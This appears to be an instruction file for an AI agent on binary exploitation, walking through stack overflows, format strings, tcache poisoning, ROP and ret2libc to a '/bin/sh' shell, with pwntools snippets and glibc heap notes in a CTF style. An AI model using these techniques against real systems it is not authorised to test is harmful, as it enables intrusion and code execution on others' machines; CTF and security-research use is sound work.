---
name: pwn-chain
description: "Building a full exploitation chain: from primitive to code execution, covering ROP, ret2libc, heap exploitation, and sandbox escape. Use this skill when a confirmed vulnerability must be turned into a working exploit."
---

# Exploitation Chain

## Overview

A chain: primitive → leak → control → payload → persistence of control. Each link must be verified before the next.

## Stage 0 — characterize

```bash
checksec --file=bin
# arch, PIE, NX, canary, RELRO
```

## Stage 1 — control

**Stack overflow:** overwrite the return address. Offset = distance to saved RIP.

```python
from pwn import *
p = process("./bin")
p.sendline(cyclic(200))
p.wait()
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))
```

**Format string:** `%n` writes; `%7$p` leaks.

```python
payload = fmtstr_payload(offset, {target: value})
```

**Heap:** UAF/tcache poisoning. Overwrite `fd` of a freed chunk to allocate at a target.

```python
# tcache poisoning (glibc 2.27-2.31, safe-linking off)
free(a); free(b)
edit(b, p64(target))
malloc(); malloc()  # returns target
```

## Stage 2 — leak

Needed when PIE/ASLR. Common: print a GOT entry via a format string, or read uninitialized memory.

```python
p.sendline(b"%9$s")   # read GOT[puts]
```

## Stage 3 — ROP

```python
rop = ROP(elf)
rop.call(elf.plt["puts"], [elf.got["puts"]])
rop.call(elf.symbols["main"])
p.sendline(flat({offset: rop.chain()}))
leak = u64(p.recvline().strip().ljust(8, b"\0"))
libc.address = leak - libc.symbols["puts"]
```

Then the second stage: `system("/bin/sh")` or `execve`.

```python
rop2 = ROP(libc)
rop2.call(libc.symbols["system"], [next(libc.search(b"/bin/sh"))])
```

## Stage 4 — ret2csu / SROP / JOP

When gadgets are scarce:

- **ret2csu**: `__libc_csu_init` gadgets set `rdi/rsi/rdx` then call.
- **SROP**: `sigreturn` frame sets all registers from a fake frame.
- **JOP**: dispatch through `call [reg]` chains.

## Stage 5 — post-exploitation

```python
p.sendline(b"cat /flag")
print(p.recvall())
```

## Heap exploitation notes

| glibc version | Technique |
|---|---|
| 2.23 | fastbin dup, unsafe unlink |
| 2.27 | tcache poisoning |
| 2.29 | tcache key check |
| 2.31 | safe-linking (2.32+) |
| 2.35+ | tcache safe-linking mandatory, `__free_hook` removed (2.34) |

With `__free_hook`/`__malloc_hook` removed (2.34+), target `_IO_file_jumps` / `__exit_funcs` or use a heap-to-stack pivot.

## Pitfalls

- A working local exploit fails remotely because of a different libc — always match the target's libc version (`libc-database`).
- Stack alignment: `system` requires 16-byte alignment at the call; add a `ret` gadget.
- seccomp filters may block `execve` — check `seccomp-tools dump`.

## Verification

The chain must yield a shell (or the intended primitive) against the same binary and libc as the target, reproducibly.
